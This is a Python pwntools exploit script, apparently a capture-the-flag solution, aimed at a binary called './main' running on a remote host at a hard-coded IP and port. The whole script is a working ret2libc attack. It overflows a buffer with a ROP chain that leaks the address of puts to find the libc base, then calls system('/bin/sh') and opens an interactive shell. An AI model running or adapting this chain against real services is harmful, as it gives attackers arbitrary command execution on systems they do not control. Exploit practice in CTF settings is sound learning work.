from pwn import*
p = process('./main')
p = remote('39.101.210.214',10004)
elf =ELF('./main')
libc =ELF('./libc-2.23.so')
context.log_level ='DEBUG'
pop_rdi_ret = 0x40127B
p.sendlineafter("GOT?\n",'U'*0x28 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x4011FB))
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['puts']
log.info('LIBC:\t' + hex(libc_base))
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
p.sendlineafter("GOT?\n",'U'*0x28 + p64(pop_rdi_ret) + p64(binsh) + p64(system))
p.interactive()
